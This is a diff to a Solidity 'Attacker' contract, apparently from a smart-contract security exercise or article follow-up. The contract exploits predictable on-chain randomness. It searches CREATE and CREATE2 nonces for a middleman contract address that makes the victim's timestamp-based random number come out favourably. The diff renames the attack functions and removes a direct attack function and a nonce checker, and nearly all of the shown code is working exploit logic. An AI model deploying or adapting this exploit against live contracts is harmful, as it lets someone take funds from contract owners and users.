@@ -35,7 +35,7 @@ contract Attacker {
     event AttackStarted(address middlemanAddress, uint nonce);
     receive() external payable{}
 
-    function attack1(uint256 _seed, address _victim) public payable {            // article method
+    function deployAndCalcRNAttack(uint256 _seed, address _victim) public payable {
         uint nonce;
         while (true) {
             address middlemanAddress = address(new Middleman());
@@ -51,7 +51,7 @@ contract Attacker {
         }
     }
 
-    function attack2(uint256 _seed, address _victim) public payable {            // my method
+    function predictAndCalcRNAttack(uint256 _seed, address _victim) public payable {
         bytes memory bytecode = type(Middleman).creationCode;
         uint nonce;
         while (true) {
@@ -67,7 +67,6 @@ contract Attacker {
                     middleman = new Middleman{
                         salt: bytes32(nonce)
                     }();
-                    // require(middlemanAddress == deployedProxy, "ERROR Different Address");
                 }else{
                    middleman =  Middleman(payable(middlemanAddress));
                 }
@@ -79,23 +78,5 @@ contract Attacker {
             }
             nonce++;
         }
-    }
-
-    function attack3(address _victim, uint _nonce) public payable {
-        console.log("nonce", _nonce);
-        Middleman middleman = new Middleman{
-            salt: bytes32(_nonce)
-        }();
-        middleman.attack{value: 1 ether}(_victim);
-        payable(msg.sender).transfer(address(this).balance);
-        emit AttackStarted(address(middleman), _nonce);
-    }
-    function checkNonce(uint _seed, uint _nonce) public view returns(bool) {
-        bytes memory bytecode = type(Middleman).creationCode;
-        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _nonce, keccak256(bytecode)));
-        address middlemanAddress = address(uint160(uint(hash)));
-        uint256 random = (block.timestamp + uint160(middlemanAddress) + _seed) % 10;
-        console.log(block.timestamp, uint160(middlemanAddress), _seed);
-        return random == 5; 
     }
 }
